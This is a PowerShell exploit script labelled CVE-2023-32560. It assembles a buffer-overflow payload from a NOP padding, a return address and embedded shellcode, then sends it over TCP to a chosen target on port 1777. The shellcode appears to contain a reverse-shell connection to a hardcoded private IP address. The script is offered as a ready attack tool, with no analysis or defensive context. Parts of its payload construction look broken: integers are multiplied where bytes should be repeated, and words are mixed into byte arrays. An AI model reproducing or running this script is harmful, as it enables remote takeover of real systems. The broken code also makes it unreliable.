param (
    [string]$TargetIP,
    [int]$Port = 1777
)

if (-not $TargetIP) {
    Write-Host "Usage: .\CVE-2023-32560.ps1 <target_ip>"
    exit
}

# Function to create payload
function Create-Payload {
    $shellcode = @(
        0xfce88200, 0x00000000, 0x6089e531, 0xc0648b50,
        0x308b520c, 0x8b52148b, 0x72280fb7, 0x4a2631ff,
        0xac3c617c, 0x022c20c1, 0xcf0d01c7, 0xe2f25257,
        0x8b52108b, 0x4a3c8b4c, 0x1178e348, 0x01d1518b,
        0x592001d3, 0x8b4918e3, 0x3a498b34, 0x8b01d631,
        0xffacc1cf, 0x0d01c738, 0xe075f603, 0x7df83b7d,
        0x2475e458, 0x8b582401, 0xd3668b0c, 0x4b8b581c,
        0x01d38b04, 0x8b01d089, 0x4424245b, 0x5b61595a,
        0x51ffe05f, 0x5f5a8b12, 0xeb8d5d68, 0x33320000,
        0x68777332, 0x5f54684c, 0x772607ff, 0xd5b89001,
        0x000029c4, 0x54506829, 0x806b00ff, 0xd5505050,
        0x50405040, 0x5068ea0f, 0xdfe0ffd5, 0x976a0568,
        0xc0a8561e, 0x68020011, 0x5c89e66a, 0x10565768,
        0x99a57461, 0xffd585c0, 0x740cff4e, 0x0875ec68,
        0xf0b5a256, 0xffd56863, 0x6d640089, 0xe3575757,
        0x31f66a12, 0x5956e2fd, 0x66c74424, 0x3c01018d,
        0x442410c6, 0x00445450, 0x56565646, 0x5646564e,
        0x56565356, 0x6879cc3f, 0x86ffd589, 0xe04e5646,
        0xff306808, 0x871d60ff, 0xd5bbe01d, 0x2a0a68a6,
        0x95bd9dff, 0x53c067c0, 0xa80fbe07, 0x505bb471,
        0x3726f6a0, 0x0053ffd5
    )

    $buf = [byte[]](0x90 * 340) + 0x812b4100 + (0x90 * 5) + $shellcode + (0x41 * 80) + 0x84d45200
    $buf2 = 0x41 * 4096

    # Create the message
    $header = 3, 5, 800
    $payload = 3, 5, $buf2

    $msg = @()
    $msg += [BitConverter]::GetBytes(0xFFFFFFFF & ($buf.Length + 16))
    $msg += [BitConverter]::GetBytes(0xFFFFFFFF & ($header.Length * 12 + $payload.Length * 12 + 16))
    $msg += [BitConverter]::GetBytes(0xFFFFFFFF & ($payload.Length * 12 + 16))
    $msg += $header + $buf + $payload

    return $msg
}

# Create the payload
$payload = Create-Payload

# Convert the payload to a byte array
$bytes = [byte[]]$payload

# Create a TCP connection to the target
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($TargetIP, $Port)

# Send the payload
$networkStream = $tcpClient.GetStream()
$networkStream.Write($bytes, 0, $bytes.Length)

Write-Host "Payload sent to $TargetIP on port $Port."

# Cleanup
$networkStream.Close()
$tcpClient.Close()